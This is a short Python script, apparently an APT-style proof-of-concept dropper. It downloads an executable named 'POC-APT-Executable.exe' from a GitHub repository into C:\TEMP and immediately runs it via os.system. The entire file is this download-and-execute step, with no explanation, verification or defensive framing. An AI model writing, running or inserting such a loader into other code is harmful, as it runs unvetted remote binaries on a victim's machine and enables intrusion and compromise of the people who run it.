import wget
import os
url="https://github.com/armjirawat/POC-APT/raw/master/POC-APT-Executable.exe"
wget.download(url,"C:\\TEMP\\POC-APT-Executable.exe")
os.system("C:\\TEMP\\POC-APT-Executable.exe")
